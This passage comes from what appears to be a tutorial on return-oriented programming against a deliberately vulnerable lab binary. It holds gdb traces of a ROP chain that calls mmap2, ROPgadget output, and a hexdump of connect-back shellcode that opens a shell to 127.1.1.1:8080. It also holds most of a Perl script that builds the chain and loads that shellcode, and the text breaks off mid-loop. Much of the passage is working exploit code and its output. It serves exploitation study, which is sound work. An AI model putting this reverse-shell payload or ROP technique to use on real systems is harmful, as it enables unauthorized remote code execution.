   0x80488e4 &lt;foo+56&gt;:  mov    eax,0x0
   0x80488e9 &lt;foo+61&gt;:  leave
   <b class="ca">0x80488ea &lt;foo+62&gt;:  ret</b>
   0x80488eb &lt;main&gt;:    lea    ecx,[esp+0x4]
(gdb) b *0x80488dc
<b class="ca">Breakpoint 1 at 0x80488dc</b>: file StackBasedOverflow.c, line 19.
(gdb) b *0x80488e1
<b class="ca">Breakpoint 2 at 0x80488e1</b>: file StackBasedOverflow.c, line 19.
(gdb) b *0x80488ea
<b class="ca">Breakpoint 3 at 0x80488ea</b>: file StackBasedOverflow.c, line 21.
(gdb) r "$(./rop_chain_1.pl)"
Starting program: /home/snake/StackBasedOverflow "$(./rop_chain_1.pl)"
[buffer:0xffffd510] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����J����������&amp;��=�
                ����J�������   _��������������&amp;�
                                               ����J�?����J��������������


<b>Breakpoint 1, 0x080488dc</b> in foo (str=0xffffd990 'A' &lt;repeats 200 times&gt;...) at StackBasedOverflow.c:19
19      strcpy(buffer, str);
</pre>
         <p>
          Below, a dump of the stack at the first breakpoint, starting
from the address pointed by
          <code>
           ebp
          </code>
          before the stack corruption.
In red, the return address of the
          <code>
           foo()
          </code>
          function.
         </p>
         <pre class="aa">
(gdb) x/16xw $ebp
0xffffd718: 0xffffd738  <b class="ca">0x0804892b</b>  0xffffd990  0x00000000
0xffffd728: 0x00000000  0x00000002  0x080ec550  0xffffd750
0xffffd738: 0x00000000  0x08048b4f  0x080ec504  0x00000000
0xffffd748: 0x00000000  0x08048b4f  0x00000002  0xffffd7c4
</pre>
         <p>
          Here, a dump of the stack at the second breakpoint, at the
same location, after the stack corruption. The injected payload
          <code>
           ROP CHAIN 1
          </code>
          is signaled in red and start at the location of the
return address of the
          <code>
           foo()
          </code>
          function.
         </p>
         <pre class="aa">
(gdb) c
Continuing.

<b>Breakpoint 2, 0x080488e1</b> in foo (str=0xffffffff &lt;error: Cannot access memory at address 0xffffffff&gt;) at StackBasedOverflow.c:19
19      strcpy(buffer, str);
(gdb) x/48xw 0xffffd718
0xffffd718: 0x41414141  <b class="ca">0x080481a9  0xffffffff  0x080d8b3d</b>
0xffffd728: <b class="ca">0x080db9df  0xffffffff  0x0806ed4a  0xffffff9f</b>
0xffffd738: <b class="ca">0x0809c5a2  0x080b9526  0xffffffdd  0x0806ed4a</b>
0xffffd748: <b class="ca">0xffffffff  0x0809c5e3  0x0805c05f  0x08048480</b>
0xffffd758: <b class="ca">0xffffffff  0x080483e6  0xffffffff  0x0806c09c</b>
0xffffd768: <b class="ca">0x080b9526  0xffffffff  0x0806ed4a  0xffffff3f</b>
0xffffd778: <b class="ca">0x0805429c  0x0806ed4a  0xffffffff  0x0805c9f7</b>
0xffffd788: <b class="ca">0x0805c9f7  0x0805c9f7  0x0805c9f7  0x0805c9f7</b>
0xffffd798: <b class="ca">0x0805c9f7  0x0805c9f7  0x0806f490</b>  0x00000000
0xffffd7a8: 0xffffd7c4  0x08048f70  0x08049010  0x00000000
0xffffd7b8: 0xffffd7bc  0x00000000  0x00000002  0xffffd918
0xffffd7c8: 0xffffd990  0x00000000  0xffffdc25  0xffffdc3c
</pre>
         <p>
          Below, a dump of the stack at the third breakpoint, starting at
the address pointed by
          <code>
           esp
          </code>
          , just before the
          <code>
           foo()
          </code>
          function return.
          <code>
           ROP CHAIN 1
          </code>
          is in place and the code to prepare
the mmap2 syscall will be executed.
         </p>
         <pre class="aa">
(gdb) c
Continuing.

<b>Breakpoint 3, 0x080488ea</b> in foo (str=0xffffffff &lt;error: Cannot access memory at address 0xffffffff&gt;) at StackBasedOverflow.c:21
21  }
(gdb) x/i $eip
=&gt; 0x80488ea &lt;foo+62&gt;:  ret
(gdb) x/48xw $esp
0xffffd71c: <b class="ca">0x080481a9  0xffffffff  0x080d8b3d  0x080db9df</b>
0xffffd72c: <b class="ca">0xffffffff  0x0806ed4a  0xffffff9f  0x0809c5a2</b>
0xffffd73c: <b class="ca">0x080b9526  0xffffffdd  0x0806ed4a  0xffffffff</b>
0xffffd74c: <b class="ca">0x0809c5e3  0x0805c05f  0x08048480  0xffffffff</b>
0xffffd75c: <b class="ca">0x080483e6  0xffffffff  0x0806c09c  0x080b9526</b>
0xffffd76c: <b class="ca">0xffffffff  0x0806ed4a  0xffffff3f  0x0805429c</b>
0xffffd77c: <b class="ca">0x0806ed4a  0xffffffff  0x0805c9f7  0x0805c9f7</b>
0xffffd78c: <b class="ca">0x0805c9f7  0x0805c9f7  0x0805c9f7  0x0805c9f7</b>
0xffffd79c: <b class="ca">0x0805c9f7  0x0806f490</b>  0x00000000  0xffffd7c4
0xffffd7ac: 0x08048f70  0x08049010  0x00000000  0xffffd7bc
0xffffd7bc: 0x00000000  0x00000002  0xffffd918  0xffffd990
0xffffd7cc: 0x00000000  0xffffdc25  0xffffdc3c  0xffffdc47
</pre>
         <p>
          Next, the
          <code>
           ret
          </code>
          instruction pop the address of the first
payload gadget in the instruction pointer and the
          <code>
           ROP CHAIN 1
          </code>
          is unrolled.
         </p>
         <pre class="aa">
(gdb) nexti
0x080481a9 in _init ()
(gdb) x/2i $eip
=&gt; 0x80481a9 &lt;_init+33&gt;:    pop    ebx
   0x80481aa &lt;_init+34&gt;:    ret
</pre>
         <p>
          Then, a breakpoint is set at the last
          <code>
           int 80, ret
          </code>
          gadget of
          <code>
           ROP CHAIN 1
          </code>
          to see if the mmap2 syscall preparations are progressing as planned.
         </p>
         <pre class="aa">
(gdb) b *0x0806f490
Breakpoint 4 at 0x806f490
(gdb) c
Continuing.

Breakpoint 4, 0x0806f490 in _dl_sysinfo_int80 ()
(gdb) x/2i $eip
=&gt; 0x806f490 &lt;_dl_sysinfo_int80&gt;:    int    0x80
   0x806f492 &lt;_dl_sysinfo_int80+2&gt;:  ret
(gdb) i r
<b class="ca">eax            0xc0    192</b>
<b class="ca">ecx            0x60    96</b>
<b class="ca">edx            0x6 6</b>
<b class="ca">ebx            0x0 0</b>
esp            0xffffd7a4   0xffffd7a4
<b class="ca">ebp            0x0 0x0</b>
<b class="ca">esi            0x22    34</b>
<b class="ca">edi            0xffffffff  -1</b>
eip            0x806f490    0x806f490 &lt;_dl_sysinfo_int80&gt;
eflags         0x206    [ PF IF ]
cs             0x23 35
ss             0x2b 43
ds             0x2b 43
es             0x2b 43
fs             0x0  0
gs             0x63 99
</pre>
         <p>
          All the values required for the
          <code>
           mmap2
          </code>
          syscall are strored in
the right registers and the
          <code>
           int 0x80
          </code>
          instruction will switch
in kernel mode. Below, the return value of the syscall stored in
          <code>
           eax
          </code>
          is displayed and points to a new memory area.
         </p>
         <pre class="aa">
(gdb) nexti
0x0806f492 in _dl_sysinfo_int80 ()
(gdb) x/i $eip
=&gt;  0x806f492 &lt;_dl_sysinfo_int80+2&gt;:    ret
(gdb) i r eax
<b class="ca">eax            0xf7ff9000</b>  -134246400
(gdb) x/32xw $eax
0xf7ff9000: 0x00000000  0x00000000  0x00000000  0x00000000
0xf7ff9010: 0x00000000  0x00000000  0x00000000  0x00000000
0xf7ff9020: 0x00000000  0x00000000  0x00000000  0x00000000
0xf7ff9030: 0x00000000  0x00000000  0x00000000  0x00000000
0xf7ff9040: 0x00000000  0x00000000  0x00000000  0x00000000
0xf7ff9050: 0x00000000  0x00000000  0x00000000  0x00000000
0xf7ff9060: 0x00000000  0x00000000  0x00000000  0x00000000
0xf7ff9070: 0x00000000  0x00000000  0x00000000  0x00000000
</pre>
         <h3 id="73-rop-chain-2-shellcode-loader_1">
          7.3 - ROP CHAIN 2: Shellcode Loader
         </h3>
         <p>
          The second part of the payload is responsible for loading an embedded
shellcode in the new memory area allocated by
          <code>
           ROP CHAIN 1
          </code>
          .
For this purpose,
          <code>
           ROP CHAIN 2
          </code>
          does this by loading an embedded shellcode
by group of 4 byte in the new memory area.
         </p>
         <p>
          The third part of the payload is responsible for redirecting the
execution path in the memory area filed with the shellcode by
          <code>
           ROP CHAIN 2
          </code>
          . But, to do this redirection
          <code>
           ROP CHAIN 3
          </code>
          needs to know the address of the new memory area where the embedded
shellcode is loaded. To this end,
          <code>
           ROP CHAIN 2
          </code>
          start by save
the return value of the mmap2 syscall in the
          <code>
           .data
          </code>
          section.
This area is not impacted by the ASLR and so it is loaded at a
constant address at each execution. So, this address can be hardcoded in the
ROP chain. The executable file headers provides the start address of the
          <code>
           .data
          </code>
          section.
         </p>
         <pre class="bb">
$ readelf -S StackBasedOverflow | grep " .data "
  [24] .data             PROGBITS        <b class="ca">080ec540</b> 0a3540 000f00 00  WA  0   0 32
</pre>
         <p>
          The embedded shellcode used here is a connect back shellcode which
open a connection to 127.1.1.1 on the port 8080. Its source
          <a href="https://github.com/VincentDary/rop-with-shellcode/blob/master/connect_back_shellcode/connect_back_shellcode.asm" style="text-decoration: none" target="_blank">
           connect_back_shellcode.asm [9]
          </a>
          is available on my GitHub repository.
         </p>
         <pre class="bb">
$ nasm connect_back_shellcode.asm
$ hexdump -C connect_back_shellcode
00000000  31 c0 b0 a4 31 db 31 c9  31 d2 cd 80 6a 66 58 31  |1...1.1.1...jfX1|
00000010  db 43 99 52 6a 01 6a 02  89 e1 cd 80 96 6a 66 58  |.C.Rj.j......jfX|
00000020  43 68 7f 01 01 01 66 68  50 50 66 53 89 e1 6a 10  |Ch....fhPPfS..j.|
00000030  51 56 89 e1 43 cd 80 87  f3 6a 02 59 b0 3f cd 80  |QV..C....j.Y.?..|
00000040  49 79 f9 b0 0b 52 68 2f  2f 73 68 68 2f 62 69 6e  |Iy...Rh//shh/bin|
00000050  89 e3 52 89 e2 53 89 e1  cd 80                    |..R..S....|
</pre>
         <p>
          Below, the selected gadgets obtained with ROPgadget added to the first script to build
          <code>
           ROP CHAIN 2
          </code>
          .
         </p>
         <pre class="bb">
0x080d88ad : inc ecx ; ret
0x08063793 : dec eax ; ret
0x080681f0 : add eax, ecx ; ret
0x0805426b : mov dword ptr [edx], eax ; ret
0x08053142 : mov dword ptr [eax + 4], edx ; ret
</pre>
         <p>
          Below, the script which build
          <code>
           ROP CHAIN 1
          </code>
          and
          <code>
           ROP CHAIN 2
          </code>
          and print it to the standard output.
         </p>
         <p>
          <a href="https://github.com/VincentDary/rop-with-shellcode/blob/master/rop_chain_2.pl" style="text-decoration: none" target="_blank">
           <b>
            <em>
             rop_chain_2.pl
            </em>
           </b>
          </a>
         </p>
         <div class="a">
          <pre><span></span><code><span class="dk">#!/usr/bin/perl</span>

<span class="fk">use</span><span class="fv"> </span><span class="eh">strict</span><span class="ft">;</span>
<span class="fk">use</span><span class="fv"> </span><span class="eh">warnings</span><span class="ft">;</span>

<span class="fk">my</span><span class="fv"> </span><span class="eq">$binary_name</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="fu">"stackbasedoverflow"</span><span class="ft">;</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$padding_overflow</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="eb">524</span><span class="ft">;</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$buffer</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="fu">""</span><span class="ft">;</span>

<span class="fk">my</span><span class="fv"> </span><span class="eq">$ffffffff</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="fu">"\xff\xff\xff\xff"</span><span class="ft">;</span>

<span class="di"># @data section</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$data_section_addr</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="fu">"\x40\xc5\x0e\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x080ec540</span>

<span class="di"># connect-back shellcode</span>
<span class="di"># to 127.01.01.01 port 8080</span>
<span class="fk">my</span><span class="fv">  </span><span class="eq">@shellcode</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="ft">(</span>
<span class="fv">    </span><span class="fu">"\x31\xc0\xb0\xa4"</span><span class="ft">,</span><span class="fv"> </span><span class="fu">"\x31\xdb\x31\xc9"</span><span class="ft">,</span><span class="fv"> </span><span class="fu">"\x31\xd2\xcd\x80"</span><span class="ft">,</span><span class="fv"> </span><span class="fu">"\x6a\x66\x58\x31"</span><span class="ft">,</span>
<span class="fv">    </span><span class="fu">"\xdb\x43\x99\x52"</span><span class="ft">,</span><span class="fv"> </span><span class="fu">"\x6a\x01\x6a\x02"</span><span class="ft">,</span><span class="fv"> </span><span class="fu">"\x89\xe1\xcd\x80"</span><span class="ft">,</span><span class="fv"> </span><span class="fu">"\x96\x6a\x66\x58"</span><span class="ft">,</span>
<span class="fv">    </span><span class="fu">"\x43\x68\x7f\x01"</span><span class="ft">,</span><span class="fv"> </span><span class="fu">"\x01\x01\x66\x68"</span><span class="ft">,</span><span class="fv"> </span><span class="fu">"\x1f\x90\x66\x53"</span><span class="ft">,</span><span class="fv"> </span><span class="fu">"\x89\xe1\x6a\x10"</span><span class="ft">,</span>
<span class="fv">    </span><span class="fu">"\x51\x56\x89\xe1"</span><span class="ft">,</span><span class="fv"> </span><span class="fu">"\x43\xcd\x80\x87"</span><span class="ft">,</span><span class="fv"> </span><span class="fu">"\xf3\x6a\x02\x59"</span><span class="ft">,</span><span class="fv"> </span><span class="fu">"\xb0\x3f\xcd\x80"</span><span class="ft">,</span>
<span class="fv">    </span><span class="fu">"\x49\x79\xf9\xb0"</span><span class="ft">,</span><span class="fv"> </span><span class="fu">"\x0b\x52\x68\x2f"</span><span class="ft">,</span><span class="fv"> </span><span class="fu">"\x2f\x73\x68\x68"</span><span class="ft">,</span><span class="fv"> </span><span class="fu">"\x2f\x62\x69\x6e"</span><span class="ft">,</span>
<span class="fv">    </span><span class="fu">"\x89\xe3\x52\x89"</span><span class="ft">,</span><span class="fv"> </span><span class="fu">"\xe2\x53\x89\xe1"</span><span class="ft">,</span><span class="fv"> </span><span class="fu">"\xcd\x80\x90\x90"</span><span class="ft">);</span>
<span class="di"># gadgets</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$pop_ebx</span><span class="fv"> </span><span class="fp">=</span><span class="fv">               </span><span class="fu">"\xa9\x81\x04\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x080481a9 : pop ebx ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$pop_ecx</span><span class="fv"> </span><span class="fp">=</span><span class="fv">               </span><span class="fu">"\xdf\xb9\x0d\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x080db9df : pop ecx ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$pop_edx</span><span class="fv"> </span><span class="fp">=</span><span class="fv">               </span><span class="fu">"\x4a\xed\x06\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x0806ed4a : pop edx ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$pop_edi</span><span class="fv"> </span><span class="fp">=</span><span class="fv">               </span><span class="fu">"\x80\x84\x04\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x08048480 : pop edi ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$pop_ebp</span><span class="fv"> </span><span class="fp">=</span><span class="fv">               </span><span class="fu">"\xe6\x83\x04\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x080483e6 : pop ebp ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$pop_eax</span><span class="fv"> </span><span class="fp">=</span><span class="fv">               </span><span class="fu">"\x26\x95\x0b\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x080b9526 : pop eax ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$inc_ebx</span><span class="fv"> </span><span class="fp">=</span><span class="fv">               </span><span class="fu">"\x3d\x8b\x0d\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x080d8b3d : inc ebx ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$inc_edx</span><span class="fv"> </span><span class="fp">=</span><span class="fv">               </span><span class="fu">"\xf7\xc9\x05\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x0805c9f7 : inc edx ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$inc_ebp</span><span class="fv"> </span><span class="fp">=</span><span class="fv">               </span><span class="fu">"\x9c\xc0\x06\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x0806c09c : inc ebp ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$inc_ecx</span><span class="fv"> </span><span class="fp">=</span><span class="fv">               </span><span class="fu">"\xad\x88\x0d\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x080d88ad : inc ecx ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$dec_eax</span><span class="fv"> </span><span class="fp">=</span><span class="fv">               </span><span class="fu">"\x93\x37\x06\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x08063793 : dec eax ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$mov_esi_edx</span><span class="fv"> </span><span class="fp">=</span><span class="fv">           </span><span class="fu">"\x5f\xc0\x05\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x0805c05f : mov esi, edx ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$sub_eax_edx</span><span class="fv"> </span><span class="fp">=</span><span class="fv">           </span><span class="fu">"\x9c\x42\x05\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x0805429c : sub eax, edx ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$add_eax_ecx</span><span class="fv"> </span><span class="fp">=</span><span class="fv">           </span><span class="fu">"\xf0\x81\x06\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x080681f0 : add eax, ecx ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$int_80</span><span class="fv"> </span><span class="fp">=</span><span class="fv">                </span><span class="fu">"\x90\xf4\x06\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x0806f490 : int 0x80 ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$mov_aedx_eax</span><span class="fv"> </span><span class="fp">=</span><span class="fv">          </span><span class="fu">"\x6b\x42\x05\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x0805426b : mov dword ptr [edx], eax ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$mov_aeax4_edx</span><span class="fv"> </span><span class="fp">=</span><span class="fv">         </span><span class="fu">"\x42\x31\x05\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x08053142 : mov dword ptr [eax + 4], edx ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$sub_ecx_edx__not_eax__and_eax_ecx</span><span class="fv">      </span><span class="fp">=</span><span class="fv"> </span><span class="fu">"\xa2\xc5\x09\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x0809c5a2 : sub ecx, edx ; not eax ; and eax, ecx ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$sub_edx_eax__mov_eax_edx__sar_eax_0x10</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="fu">"\xe3\xc5\x09\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x0809c5e3 : sub edx, eax ; mov eax, edx ; sar eax, 0x10 ; ret</span>

<span class="di"># gadget use for debug</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$nop</span><span class="fv"> </span><span class="fp">=</span><span class="fv">                   </span><span class="fu">"\x0f\x2f\x05\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x08052f0f : nop ; ret</span>

<span class="di"># set the stack padding overflow</span>
<span class="eq">$buffer</span><span class="fv">  </span><span class="fp">=</span><span class="fv">  </span><span class="fu">'A'</span><span class="fv"> </span><span class="fo">x</span><span class="fv"> </span><span class="eq">$padding_overflow</span><span class="ft">;</span>

<span class="di">#********************</span>
<span class="di"># memory allocator</span>
<span class="di">#********************</span>

<span class="di"># mmap(0,sizeof(shellcode),prot_exec|prot_write,map_anonymous|map_private,-1,0);</span>

<span class="di"># arg1 : unsigned long addr = 0</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_ebx</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># ebx = 0xffffffff</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$ffffffff</span><span class="ft">;</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$inc_ebx</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># ebx = 0x00000000</span>

<span class="di"># arg2 : unsigned long len = sizeof(shellcode)</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_ecx</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># ecx = 0xffffffff</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$ffffffff</span><span class="ft">;</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_edx</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># edx = 0xffffff9f</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="fu">"\x9f\xff\xff\xff"</span><span class="ft">;</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$sub_ecx_edx__not_eax__and_eax_ecx</span><span class="ft">;</span><span class="fv">      </span><span class="di"># ecx = 0x00000060</span>

<span class="di"># arg4 : unsigned long flags = MAP_ANONYMOUS|MAP_PRIVATE</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_eax</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># eax = 0xffffffdd</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="fu">"\xdd\xff\xff\xff"</span><span class="ft">;</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_edx</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># edx = 0xffffffff</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$ffffffff</span><span class="ft">;</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$sub_edx_eax__mov_eax_edx__sar_eax_0x10</span><span class="ft">;</span><span class="fv"> </span><span class="di"># edx = 0x00000022</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$mov_esi_edx</span><span class="ft">;</span>

<span class="di"># arg5 : unsigned long fd = -1</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_edi</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># edi = 0xffffffff</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$ffffffff</span><span class="ft">;</span>

<span class="di"># arg6 : unsigned long offset = 0</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_ebp</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># esi = 0xffffffff</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$ffffffff</span><span class="ft">;</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$inc_ebp</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># esi = 0x00000000</span>

<span class="di"># set the syscall number in eax</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_eax</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># eax = 0xffffffff</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$ffffffff</span><span class="ft">;</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_edx</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># edx = 0xffffff3f</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="fu">"\x3f\xff\xff\xff"</span><span class="ft">;</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$sub_eax_edx</span><span class="ft">;</span><span class="fv">                            </span><span class="di"># eax = 0x000000c0</span>

<span class="di"># arg3 : unsigned long prot = PROT_EXEC|PROT_WRITE</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_edx</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># edx = 0xffffffff</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$ffffffff</span><span class="ft">;</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$inc_edx</span><span class="fv"> </span><span class="fo">x</span><span class="fv"> </span><span class="eb">7</span><span class="ft">;</span><span class="fv">                            </span><span class="di"># edx = 0x00000006</span>

<span class="di"># perform the mmap2 syscall</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$int_80</span><span class="ft">;</span><span class="fv">                                 </span><span class="di"># eax = @new_executable_memory</span>


<span class="di">#********************</span>
<span class="di"># shellcode loader</span>
<span class="di">#********************</span>

<span class="di"># save @new_executable_memory on @data</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_edx</span><span class="ft">;</span><span class="fv">                    </span><span class="di"># edx = @data</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$data_section_addr</span><span class="ft">;</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$mov_aedx_eax</span><span class="ft">;</span><span class="fv">               </span><span class="di"># [@data] = @new_executable_memory</span>

<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_ecx</span><span class="ft">;</span><span class="fv">                    </span><span class="di"># ecx = 0xffffffff</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$ffffffff</span><span class="ft">;</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$inc_ecx</span><span class="fv"> </span><span class="fo">x</span><span class="fv"> </span><span class="eb">5</span><span class="ft">;</span><span class="fv">                </span><span class="di"># ecx = 0x00000004</span>

<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$dec_eax</span><span class="fv"> </span><span class="fo">x</span><span class="fv"> </span><span class="eb">4</span><span class="ft">;</span><span class="fv">                </span><span class="di"># eax = @new_executable_memory - 4</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_edx</span><span class="ft">;</span><span class="fv">                    </span><span class="di"># edx = "\x31\xc0\xb0\xa4"</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$shellcode</span><span class="ft">[</span><span class="eb">0</span><span class="ft">];</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$mov_aeax4_edx</span><span class="ft">;</span><span class="fv">              </span><span class="di"># [@new_executable_memory] = "\x31\xc0\xb0\xa4"</span>

<span class="fk">for</span><span class="fv"> </span><span class="ft">(</span><span class="fk">my</span><span class="fv"> </span><span class="eq">$i</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="eb">1</span><span class="ft">;</span><span class="fv"> </span><span class="eq">$i</span><span class="fv"> </span><span class="fp">&lt;</span><span class="fv"> </span><span class="eb">23</span><span class="ft">;</span><span class="fv"> </span><span class="eq">$i</span><span class="fp">++</span><span class="ft">)</span>
<span class="ft">{</span>
